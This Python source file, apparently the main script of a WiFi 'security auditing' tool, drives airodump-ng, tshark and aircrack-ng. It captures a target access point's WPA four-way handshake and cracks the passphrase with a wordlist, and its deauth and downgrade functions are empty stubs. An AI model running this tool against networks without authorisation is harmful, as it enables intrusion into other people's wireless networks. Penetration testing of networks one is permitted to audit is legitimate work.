#!/usr/bin/env python3

# WiFiSecAudit - A WiFi Security Auditing Script - main.py
# Copyright (C) 2025 Islc12
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program. If not, see <https://www.gnu.org/licenses/>.

import os
import subprocess
import time
from datetime import datetime
from monitor import main as monitor_main

# Run as root
if os.geteuid() != 0:
    print("ATTENTION: Script requires root privlages, please run as root")
    exit(1)

CAP_DIR = "CaptureFiles"  

def inputs():
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    file_name = f"{CAP_DIR}/capture_{timestamp}"
    bssid = input("Enter target AP BSSID: ")
    channel = int(input("Enter target AP channel: "))
    wordlist = input("Enter the path to your wordlist file: ")

    return file_name, bssid, channel, wordlist

def airodump(file_name, bssid, channel):
    """Starts airodump-ng and waits for the capture file to appear."""

    cap_file = f"{file_name}-01.cap"
    airodump_cmd = ["airodump-ng", "-d", bssid, "-c", str(channel), "-w", file_name, "wlan1"]
    airodump_proc = subprocess.Popen(airodump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    if not cap_file:
        print("Error: No capture file found!")
        airodump_proc.terminate()
        return None, airodump_proc  # Ensure it still returns a tuple

    print(f"Using capture file: {cap_file}")
    return cap_file, airodump_proc

def tshark():
    """Monitors the capture file for EAPOL packets."""
    file_name, bssid, channel, wordlist = inputs()
    cap_file, airodump_proc = airodump(file_name, bssid, channel)

    time.sleep(2)  # Give time to start filling the file
    print("Checking for EAPOL packets...")

    eapol_count = 0
    try:
        while eapol_count != 4:
            cmd = ["tshark", "-r", cap_file, "-Y", "eapol", "-l"]
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)

            for line in process.stdout:
                print(line.strip())
                if eapol_count >= 4:
                    print("Captured 4 way handshake!")
                    return
                else:
                    if "EAPOL" in line:
                        eapol_count += 1
                        print(f"EAPOL: {eapol_count}/4")
                        time.sleep(1) # Helps ensure buffer time between file reads
            
            process.wait()
            time.sleep(1) 

    finally:
        airodump_proc.terminate()
        return cap_file, wordlist

def deauth():
    pass

def downgrade():
    pass

def crack(cap_file, wordlist):
    aircrack_cmd = ["aircrack-ng", "-w", wordlist, cap_file]
    aircrack_proc = subprocess.run(aircrack_cmd, text=True, capture_output=True)
    print(aircrack_proc.stdout)

if __name__ == '__main__':
    if monitor_main():
        cap_file, wordlist = tshark()
        crack(cap_file, wordlist)
